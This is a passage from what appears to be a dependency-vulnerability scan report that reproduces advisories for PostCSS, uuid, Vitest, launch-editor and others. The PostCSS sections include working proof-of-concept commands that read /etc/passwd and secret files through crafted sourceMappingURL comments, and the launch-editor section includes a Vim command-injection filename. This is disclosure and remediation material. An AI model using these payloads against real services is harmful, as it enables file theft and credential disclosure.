  let map = new PreviousMap(this.css, opts)
  if (map.text) {
    this.map = map
    let file = map.consumer().file
    if (!this.file && file) this.file = this.mapResolve(file)
  }
}
```

`PreviousMap` constructor (`lib/previous-map.js:17-29`):

```js
constructor(css, opts) {
  if (opts.map === false) return
  this.loadAnnotation(css)
  this.inline = this.startWith(this.annotation, 'data:')

  let prev = opts.map ? opts.map.prev : undefined
  let text = this.loadMap(opts.from, prev)
  ...
}
```

Note `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.

`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:

```js
loadAnnotation(css) {
  let comments = css.match(/\/\*\s*# sourceMappingURL=/g)
  if (!comments) return
  let start = css.lastIndexOf(comments.pop())
  let end = css.indexOf('*/', start)
  if (start > -1 && end > -1) {
    this.annotation = this.getAnnotationURL(css.substring(start, end))
  }
}
```

`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.

`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:

```js
} else if (this.annotation) {
  let map = this.annotation
  if (file) map = join(dirname(file), map)
  return this.loadFile(map)
}
```

* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.
* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.

`loadFile` (`lib/previous-map.js:86-92`) is the sink:

```js
loadFile(path) {
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
}
```

The bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:

```
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

This error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.

Trust-boundary analysis:
* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.
* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.
* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.

Primitives obtained:
* (a) **Arbitrary file read** — bytes loaded into Node memory.
* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.
* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.
* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.

## PoC

All commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.

**Vector 1 — Absolute path, default options (no `from`, no `map`):**

```bash
$ node -e 'const p=require("postcss"); \
  try { p().process("a{color:red}\n/*# sourceMappingURL=/etc/passwd */"); } \
  catch(e){console.log(e.message)}'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

The first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.

**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**

```bash
$ node -e 'const p=require("postcss"); \
  p().process("a{color:red}\n/*# sourceMappingURL=../../../../../etc/passwd */", \
              {from:"/var/www/html/styles/main.css", map:{inline:false}}) \
   .catch(e=>console.log(e.message))'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.

**Vector 3 — File-existence oracle:**

```bash
# Existing non-JSON file → throws (file confirmed to exist)
$ node -e 'require("postcss")().process("a{}\n/*# sourceMappingURL=/etc/passwd */")'
SyntaxError: Unexpected token 'r', "root:x:0:0"... is not valid JSON

# Non-existent file → returns silently (file confirmed absent)
$ node -e 'r=require("postcss")().process("a{}\n/*# sourceMappingURL=/no/such/file */"); console.log("ok")'
ok
```

**Vector 4 — Custom file-content leak:**

```bash
$ printf 'API_KEY=sk-s…[REDACTED]' > /tmp/server-secret.env
$ node -e 'require("postcss")().process("a{}\n/*# sourceMappingURL=/tmp/server-secret.env */")' 2>&1 | head -1
SyntaxError: Unexpected token 'A', "API_KEY=sk"... is not valid JSON
```

The first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.

**Filesystem-call trace** (proves the read happens with no opts at all):

```js
const fs = require('fs');
const orig = fs.readFileSync;
fs.readFileSync = function(p){
  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);
  return orig.apply(this, arguments);
};
require('postcss')().process('a{}\n/*# sourceMappingURL=/etc/hostname */');
// → [FILE READ]: /etc/hostname
// → SyntaxError: Unexpected token 'D', "Debian-tri"... is not valid JSON
```

## Impact

* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.
* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).
* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.
* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.
* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.

## Recommended Fix

The root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:

1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):

   ```js
   // lib/previous-map.js
   loadMap(file, prev) {
     if (prev === false) return false
     if (prev) { /* unchanged */ }
     else if (this.inline) {
       return this.decodeInline(this.annotation)
     } else if (this.annotation) {
       let annotation = this.annotation
       // Reject schemes (other than data:, handled above) and absolute paths.
       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return
       if (require('path').isAbsolute(annotation)) return
       if (!file) return  // No base path → cannot safely resolve.
       const base = require('path').resolve(require('path').dirname(file))
       const resolved = require('path').resolve(base, annotation)
       // Refuse anything that escapes the base directory.
       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {
         return
       }
       return this.loadFile(resolved)
     }
   }
   ```

2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.

A user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.

---
## [🟠 HIGH] F-9e172a32070d: PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Vulnerability Details

**File**: `lib/previous-map.js`
**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)


### Root Cause
PostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a "previous source map." This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).

`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.

8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).

Once loaded, `MapGenerator.isMap()` treats the mere presence of a loaded "previous map" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.

### Attack Scenario
1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.
2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).
3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.
4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).
5. Attacker retrieves the emitted map and reads out the traversed file's content.

### Impact
Disclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.

### Vulnerable Code
```js
loadFile(path, cssFile, trusted) {
  if (!trusted && !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
}

loadMap(file, prev) {
  ...
  } else if (this.annotation) {
    let map = this.annotation
    if (file) map = join(dirname(file), map)
    let unknown = this.loadFile(map, file, false)
    ...
  }
}
```

### Recommended Fix
Constrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:
```js
loadFile(path, cssFile, trusted) {
  if (!trusted && !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
    if (!cssFile) return undefined
    let root = resolve(dirname(cssFile))
    let resolvedPath = resolve(root, path)
    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {
      return undefined
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
}
```
I've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.

### Verification
Dynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a "secret" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.

---
## [🟠 HIGH] F-5ab4fee10a21: PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
## Summary

The fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.

`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.

## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)

```js
// lib/previous-map.js
loadFile(path, cssFile, trusted) {
  if (!trusted && !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
    if (cssFile) {                       // guard runs ONLY when `from` is set
      let relativePath = relative(dirname(cssFile), path)
      if (relativePath === '..' ||
          relativePath.startsWith('..' + sep) ||
          isAbsolute(relativePath)) {
        return undefined
      }
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()   // sink
  }
}

// loadMap(): untrusted annotation path, trusted=false; file === opts.from
} else if (this.annotation) {
  let map = this.annotation
  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL
  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy
```

## Proof of concept (verified on postcss 8.5.22)

```js
const postcss = require('postcss')
const fs = require('fs')

// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)
const secret = '/tmp…[REDACTED]'
fs.writeFileSync(secret, JSON.stringify({
  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],
  sourcesContent: ['TOP_SECRET_abcdef']
}))

const css = 'a{color:red}\n/*# sourceMappingURL=' + secret + ' */'
const leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')

;(async () => {
  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed
  const a = await postcss([]).process(css, { map: true })
  console.log('no from   -> leaked:', !!leaks(a.map))   // true

  // B) WITH `from` -> guard active -> blocked
  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })
  console.log('with from -> leaked:', !!leaks(b.map))    // false
})()
```

Observed output on postcss 8.5.22:

```
no from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map
with from -> leaked: false     # guard rejects the absolute path
```

`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.

## Impact

Arbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.

## Suggested fix

Apply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.

---
## [🟠 HIGH] F-9d4a10f0ce9e: source-map-js allows event-loop denial of service through indexed source-map section offsets
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.

---
## [🟠 HIGH] F-19654f0183d6: uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner,trivy` | **Risk Score:** `8.0/10`

**Technical Details:**
### Summary

The `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  
By contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.

This inconsistency allows **silent partial writes** into caller-provided buffers.


### Affected code

- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.
- `src/v6.ts` writes `buf[offset + i]` without bounds validation.

### Reproducible PoC

```bash
cd /home/StrawHat/uuid
npm ci
npm run build

node --input-type=module -e "
import {v4,v5,v6} from './dist-node/index.js';
const ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';
for (const [name,fn] of [
  ['v4()',()=>v4({},new Uint8Array(8),4)],
  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],
  ['v6()',()=>v6({},new Uint8Array(8),4)],
]) {
  try { fn(); console.log(name,'NO_THROW'); }
  catch(e){ console.log(name,'THREW',e.name); }
}"
```

Observed:

- `v4() THREW RangeError`
- `v5() NO_THROW`
- `v6() NO_THROW`

Example partial overwrite evidence captured during audit:

```text
same true buf [
  170, 170, 170, 170,
   75, 224, 100,  63
]
v6 [
  187, 187, 187, 187,
   31,  19, 185,  64
]
```

### Security impact

- **Primary**: integrity/robustness issue (silent partial output).
- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.
- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.

### Suggested fix

Add the same guard used by `v4()`/`v1()`/`v7()`:

```ts
if (offset < 0 || offset + 16 > buf.length) {
  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
}
```

Apply to:

- `src/v35.ts` (covers `v3()` and `v5()`)
- `src/v6.ts`

---
## [🟠 HIGH] F-1256f3abbf39: PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `7.2/10`

**Technical Details:**
### Impact

`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as
`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id
indexes. Three passes scanned those index arrays linearly for every index,
making the parse O(n^2) in the number of indexes rather than in input length:
`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.
Parsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a
single thread. A benign selector of identical byte size parses in tens of
milliseconds, so the cost is driven by the index count, not the input size.
The nesting depth of such a selector is 0, so the `maxNestingDepth` guard added
in 7.1.3 offers no protection.

Reachability is deployment dependent. Only consumers that parse untrusted,
attacker-supplied selectors synchronously in a request path are exposed, for
example CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary
build-time use on trusted sources is not affected.

### Patches

Fixed in 7.1.6. The three passes now use Set membership tests, making parsing
linear in the number of indexes. There is no behaviour change: parsing is
byte-identical on a differential corpus of 8413 selectors.

### Workarounds

Cap the size of selectors accepted from untrusted sources before parsing.

---
## [🟠 HIGH] F-0095b4bfd926: Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `7.2/10`

**Technical Details:**
## Summary
`@vitest/mocker` registers a redirect mock's target path without validating it
against the dev server's file-serving allowlist. An attacker who can reach the
dev server's WebSocket can register a redirect mock pointing outside the project
root; when the mocked module is requested, the plugin's `load` hook returns
`readFile(<attacker path>)` as the module source, disclosing local files.

This is exploitable **without authentication** only through the public
`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev
servers), which register the handler on Vite's unauthenticated HMR socket.
Vitest's own browser mode registers mocks over a **token-authenticated** RPC and
is not remotely reachable by default (see Scope).

## Affected code
`packages/mocker/src/node/interceptorPlugin.ts`.

The `load` hook is the file-read sink:

```ts
if (mock.type === 'redirect') {
  return readFile(mock.redirect, 'utf-8')
}
```

`mock.redirect` is derived from client input at registration time with no
boundary check:

```ts
if (event.type === 'redirect') {
  const redirectUrl = new URL(event.redirect)
  event.redirect = join(server.config.root, redirectUrl.pathname)
}
registry.register(event)
```

There is no `server.fs.allow` / `server.fs.deny` check and no assertion that the
resolved path stays within the project root.

## Registration paths and trust boundaries
- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In
  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`
  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin
  check, so any client that can reach it can register a redirect mock. This is
  the path the "unauthenticated" impact applies to.
- **Vitest browser mode (authenticated).** Mocks register over the browser RPC
  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a
  random `api.token`). The interceptor's `configureServer` socket is not used for
  registration here (in v5 it does not run at all, as the plugin is injected per
  environment). The same missing boundary check exists on the authenticated RPC
  path, but reaching it requires the token, so it is not a remote-unauthenticated
  read.

## Path handling
`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**
confine reads to the root:

- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,
  so `..` segments are collapsed and the result stays under the root. Payloads of
  the form `file:///../../etc/passwd` do **not** escape.
- A non-special (opaque) scheme preserves `..` in `pathname`, so
  `join(root, "../../…/etc/passwd")` resolves outside the root and reads an
  arbitrary file.

Even without escaping the root, the missing `server.fs` check allows reading any
in-root file the dev server would otherwise refuse to serve (for example an
in-root `.env` or source that is denied by `server.fs.deny`).

## Scope / preconditions
- This is a **development-server** issue. The dev server binds to `localhost` by
  default and is not reachable from the network unless the developer exposes it
  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).
- A raw (non-browser) client against a reachable server bypasses browser origin
  and CORS protections entirely and can both register the mock and read the
  response.
- A browser-based drive-by against a localhost server is substantially mitigated
  by Vite defaults: the default CORS origin allowlist is limited to `localhost`
  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page
  cannot read the file contents back.

## Impact
Disclosure of local files readable by the dev-server process (source, in-root
`.env`/secrets, and, via the opaque-scheme payload, files outside the project
root). No integrity or availability impact.

## Affected versions
Present since `@vitest/mocker` was introduced.

- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and
  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.
- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not
  maintained and are not planned to receive the fix.

## Fix
Validate the resolved redirect target against Vite's file-serving allowlist
(`isFileLoadingAllowed`) before registering it, at every registration site, and
stop registering the interceptor WebSocket events in Vitest's browser mode
(mocks there flow through the authenticated RPC).

---
## [🟠 HIGH] F-179bd71858ac: Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `7.2/10`

**Technical Details:**
## Summary
`@vitest/mocker` registers a redirect mock's target path without validating it
against the dev server's file-serving allowlist. An attacker who can reach the
dev server's WebSocket can register a redirect mock pointing outside the project
root; when the mocked module is requested, the plugin's `load` hook returns
`readFile(<attacker path>)` as the module source, disclosing local files.

This is exploitable **without authentication** only through the public
`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev
servers), which register the handler on Vite's unauthenticated HMR socket.
Vitest's own browser mode registers mocks over a **token-authenticated** RPC and
is not remotely reachable by default (see Scope).

## Affected code
`packages/mocker/src/node/interceptorPlugin.ts`.

The `load` hook is the file-read sink:

```ts
if (mock.type === 'redirect') {
  return readFile(mock.redirect, 'utf-8')
}
```

`mock.redirect` is derived from client input at registration time with no
boundary check:

```ts
if (event.type === 'redirect') {
  const redirectUrl = new URL(event.redirect)
  event.redirect = join(server.config.root, redirectUrl.pathname)
}
registry.register(event)
```

There is no `server.fs.allow` / `server.fs.deny` check and no assertion that the
resolved path stays within the project root.

## Registration paths and trust boundaries
- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In
  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`
  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin
  check, so any client that can reach it can register a redirect mock. This is
  the path the "unauthenticated" impact applies to.
- **Vitest browser mode (authenticated).** Mocks register over the browser RPC
  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a
  random `api.token`). The interceptor's `configureServer` socket is not used for
  registration here (in v5 it does not run at all, as the plugin is injected per
  environment). The same missing boundary check exists on the authenticated RPC
  path, but reaching it requires the token, so it is not a remote-unauthenticated
  read.

## Path handling
`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**
confine reads to the root:

- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,
  so `..` segments are collapsed and the result stays under the root. Payloads of
  the form `file:///../../etc/passwd` do **not** escape.
- A non-special (opaque) scheme preserves `..` in `pathname`, so
  `join(root, "../../…/etc/passwd")` resolves outside the root and reads an
  arbitrary file.

Even without escaping the root, the missing `server.fs` check allows reading any
in-root file the dev server would otherwise refuse to serve (for example an
in-root `.env` or source that is denied by `server.fs.deny`).

## Scope / preconditions
- This is a **development-server** issue. The dev server binds to `localhost` by
  default and is not reachable from the network unless the developer exposes it
  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).
- A raw (non-browser) client against a reachable server bypasses browser origin
  and CORS protections entirely and can both register the mock and read the
  response.
- A browser-based drive-by against a localhost server is substantially mitigated
  by Vite defaults: the default CORS origin allowlist is limited to `localhost`
  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page
  cannot read the file contents back.

## Impact
Disclosure of local files readable by the dev-server process (source, in-root
`.env`/secrets, and, via the opaque-scheme payload, files outside the project
root). No integrity or availability impact.

## Affected versions
Present since `@vitest/mocker` was introduced.

- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and
  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.
- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not
  maintained and are not planned to receive the fix.

## Fix
Validate the resolved redirect target against Vite's file-serving allowlist
(`isFileLoadingAllowed`) before registering it, at every registration site, and
stop registering the interceptor WebSocket events in Vitest's browser mode
(mocks there flow through the authenticated RPC).

---
## [🟠 HIGH] F-159c1a2f5cdc: braces vulnerable to stack-exhaustion denial of service through deeply nested patterns
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `7.2/10`

**Technical Details:**
braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError.

---
## [🟠 HIGH] F-859bc376c587: launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `7.2/10`

**Technical Details:**
### Summary

`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.

### Impact

#### Direct `launch-editor` users

Only apps that match all of the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL

#### `launch-editor-middleware` users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- launch-editor older than v2.2.0 is used, or the user is using WSL

#### Vite users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- The user is using WSL

### Details

`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:
```
+call writefile(["SAFE_MARKER"],"LAUNCH_EDITOR_MARKER")|qa!
```
is not treated as a filename when passed to Vim. Vim executes the embedded Ex command.

The following editor has a potentially destructive operation exposed to the CLI arguments:
- Vim (including gVim)
- MacVim
- Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)

`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.

Vite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.

---
## [🟠 HIGH] F-416abb1a9d6f: launch-editor: `fs.existsSync()` existence check can be bypassed on Windows
- **Location:** `package-lock.json`
- **Category:** `sca` | **Source:** `osv-scanner` | **Risk Score:** `7.2/10`

**Technical Details:**
### Summary

